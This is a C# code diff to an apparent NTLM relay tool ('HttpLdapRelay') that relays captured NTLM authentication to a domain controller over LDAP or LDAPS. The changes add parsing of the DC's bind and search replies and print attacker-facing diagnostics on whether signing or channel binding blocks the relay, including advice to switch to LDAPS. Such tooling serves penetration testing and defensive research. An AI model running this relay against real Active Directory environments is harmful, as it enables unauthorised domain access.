@@ -4,6 +4,31 @@ using System.Text;
 
 namespace HttpLdapRelay
 {
+    public class LdapResult
+    {
+        public int ResultCode { get; set; }
+        public string MatchedDn { get; set; }
+        public string DiagnosticMessage { get; set; }
+    }
+
+    /// <summary>
+    /// Thrown when the DC explicitly rejects a relayed bind or post-bind operation
+    /// (typically LDAP signing required on plain LDAP, or LDAPS channel binding / EPA enforced).
+    /// </summary>
+    public class LdapRelayRejectedException : Exception
+    {
+        public LdapResult Result { get; }
+        public bool UseSsl { get; }
+
+        public LdapRelayRejectedException(LdapResult result, bool useSsl, string message)
+            : base(message)
+        {
+            Result = result;
+            UseSsl = useSsl;
+        }
+    }
+
+
     public class LdapRelayClient : IDisposable
     {
         private TcpClient _tcpClient;
@@ -12,6 +37,7 @@ namespace HttpLdapRelay
         private readonly int _targetPort;
         private readonly bool _useSsl;
         private int _messageId = 0;
+        public bool UseSsl => _useSsl;
 
         public LdapRelayClient(string targetHost, int targetPort, bool useSsl = false)
         {
@@ -48,11 +74,12 @@ namespace HttpLdapRelay
             return ExtractNtlmFromSpnego(response);
         }
 
-        public void SendNtlmAuthenticate(byte[] ntlmType3)
+        public LdapResult SendNtlmAuthenticate(byte[] ntlmType3)
         {
             byte[] spnego = BuildSpnegoNegTokenResp(ntlmType3);
             SendMessage(BuildSaslBindRequest(spnego));
-            ReceiveMessage();
+            byte[] response = ReceiveMessage();
+            return ParseBindResponse(response);
         }
 
         private byte[] BuildSaslBindRequest(byte[] spnego)
@@ -144,6 +171,21 @@ namespace HttpLdapRelay
 
             if (string.IsNullOrEmpty(dn))
             {
+                // The search may have been rejected by the DC (e.g. LDAP signing or LDAPS channel binding required).
+                // The rejection comes back as a SearchResultDone (0x65) with a non-zero resultCode.
+                LdapResult done = ParseSearchResultDone(response);
+                if (done != null && done.ResultCode != 0)
+                {
+                    string diagnostic = DiagnoseRelayFailure(done, _useSsl);
+                    if (!string.IsNullOrEmpty(diagnostic))
+                    {
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine(diagnostic);
+                        Console.ResetColor();
+                    }
+                    throw new LdapRelayRejectedException(done, _useSsl,
+                        $"LDAP search rejected by DC (code {done.ResultCode} - {GetStaticLdapErrorMessage(done.ResultCode)})");
+                }
                 Console.WriteLine($"[!] Could not find DN for {samAccountName}");
             }
 
@@ -618,20 +660,35 @@ namespace HttpLdapRelay
             return values;
         }
 
-        private class LdapResult
+        private LdapResult ParseModifyResponse(byte[] response) => ParseLdapResultResponse(response, 0x67);
+
+        /// <summary>
+        /// Parse a SASL BindResponse (tag 0x61) into an LdapResult.
+        /// </summary>
+        private LdapResult ParseBindResponse(byte[] response) => ParseLdapResultResponse(response, 0x61);
+
+        /// <summary>
+        /// Parse a SearchResultDone (tag 0x65) into an LdapResult.
+        /// Returns null if the response does not contain a SearchResultDone (e.g. it carried a SearchResultEntry).
+        /// </summary>
+        private LdapResult ParseSearchResultDone(byte[] response)
         {
-            public int ResultCode { get; set; }
-            public string MatchedDn { get; set; }
-            public string DiagnosticMessage { get; set; }
+            int idx = FindTag(response, 0x65);
+            if (idx < 0) return null;
+            return ParseLdapResultResponse(response, 0x65);
         }
 
-        private LdapResult ParseModifyResponse(byte[] response)
+        /// <summary>
+        /// Generic parser for LDAPResult-shaped responses (BindResponse 0x61, SearchResultDone 0x65, ModifyResponse 0x67, ...).
+        /// All of them share the LDAPResult ASN.1 structure: ENUMERATED resultCode, OCTET STRING matchedDN, OCTET STRING diagnosticMessage.
+        /// </summary>
+        private LdapResult ParseLdapResultResponse(byte[] response, byte tag)
         {
             var result = new LdapResult();
 
             try
             {
-                int idx = FindTag(response, 0x67);
+                int idx = FindTag(response, tag);
                 if (idx >= 0)
                 {
                     idx++;
@@ -679,6 +736,91 @@ namespace HttpLdapRelay
             return result;
         }
 
+        /// <summary>
+        /// Inspect an LdapResult coming from a relayed bind or post-bind operation and return a multi-line
+        /// human-readable diagnostic block when the failure pattern matches LDAP signing required (plain LDAP)
+        /// or LDAPS channel binding required. Returns null when the result is a clean success (code 0).
+        /// </summary>
+        public static string DiagnoseRelayFailure(LdapResult r, bool useSsl)
+        {
+            if (r == null) return null;
+            if (r.ResultCode == 0) return null;
+
+            string diag = r.DiagnosticMessage ?? string.Empty;
+            string diagLower = diag.ToLowerInvariant();
+
+            bool channelBindingPattern =
+                diag.Contains("80090346") ||
+                diagLower.Contains("channel binding") ||
+                diagLower.Contains("channel bindings");
+
+            bool signingPattern =
+                diag.Contains("00002028") ||
+                diag.Contains("0xc0000418") ||
+                diagLower.Contains("integrity check") ||
+                diagLower.Contains("turn on integrity") ||
+                diagLower.Contains("strongerauthrequired");
+
+            // strongerAuthRequired (8) on LDAP without SSL is the canonical "signing required" symptom,
+            // even when the diagnostic message is empty.
+            bool likelySigning = !useSsl && (signingPattern || r.ResultCode == 8);
+            // strongerAuthRequired (8) on LDAPS implies channel binding enforcement (EPA).
+            bool likelyChannelBinding = useSsl && (channelBindingPattern || r.ResultCode == 8);
+
+            var sb = new StringBuilder();
+            sb.AppendLine("[!] ═══════════════════════════════════════════════════════");
+            if (likelySigning)
+            {
+                sb.AppendLine("[!]   LDAP SIGNING IS REQUIRED ON THE TARGET DC");
+            }
+            else if (likelyChannelBinding)
+            {
+                sb.AppendLine("[!]   LDAPS CHANNEL BINDING (EPA) IS ENFORCED ON THE TARGET DC");
+            }
+            else
+            {
+                sb.AppendLine("[!]   LDAP RELAY FAILED");
+            }
+            sb.AppendLine("[!] ═══════════════════════════════════════════════════════");
+            sb.AppendLine($"[!] DC response code: {r.ResultCode} ({GetStaticLdapErrorMessage(r.ResultCode)})");
+            if (!string.IsNullOrEmpty(diag))
+            {
+                sb.AppendLine($"[!] Diagnostic: {diag}");
+            }
+            if (likelySigning)
+            {
+                sb.AppendLine("[!] The relayed NTLM bind cannot be signed: every post-bind");
+                sb.AppendLine("[!] operation will be rejected by the DC.");
+                sb.AppendLine("[!] Retry with -s (or --ldaps) to target LDAPS on port 636.");
+            }
+            else if (likelyChannelBinding)
+            {
+                sb.AppendLine("[!] The relayed bind cannot satisfy channel binding (EPA):");
+                sb.AppendLine("[!] the attack cannot succeed against this DC configuration.");
+            }
+            return sb.ToString().TrimEnd('\r', '\n');
+        }
+
+        private static string GetStaticLdapErrorMessage(int errorCode)
+        {
+            return errorCode switch
+            {
+                0 => "Success",
+                1 => "Operations Error",
+                2 => "Protocol Error",
+                7 => "Auth Method Not Supported",
+                8 => "Strong Auth Required",
+                16 => "No Such Attribute",
+                19 => "Constraint Violation",
+                20 => "Attribute Or Value Exists",
+                21 => "Invalid Attribute Syntax",
+                32 => "No Such Object",
+                49 => "Invalid Credentials",
+                50 => "Insufficient Access Rights",
+                53 => "Unwilling To Perform",
+                _ => $"Unknown Error ({errorCode})"
+            };
+        }
         private (int length, int newIndex) ReadLength(byte[] data, int index)
         {
             if (index >= data.Length) return (0, index);
@@ -705,27 +847,7 @@ namespace HttpLdapRelay
             return -1;
         }
 
-        private string GetLdapErrorMessage(int errorCode)
-        {
-            return errorCode switch
-            {
-                0 => "Success",
-                1 => "Operations Error",
-                2 => "Protocol Error",
-                7 => "Auth Method Not Supported",
-                8 => "Strong Auth Required",
-                16 => "No Such Attribute",
-                19 => "Constraint Violation",
-                20 => "Attribute Or Value Exists",
-                21 => "Invalid Attribute Syntax",
-                32 => "No Such Object",
-                49 => "Invalid Credentials",
-                50 => "Insufficient Access Rights",
-                53 => "Unwilling To Perform",
-                _ => $"Unknown Error ({errorCode})"
-            };
-        }
-
+        private string GetLdapErrorMessage(int errorCode) => GetStaticLdapErrorMessage(errorCode);
         // =========================================================
         // ASN.1 Encoding
         // =========================================================
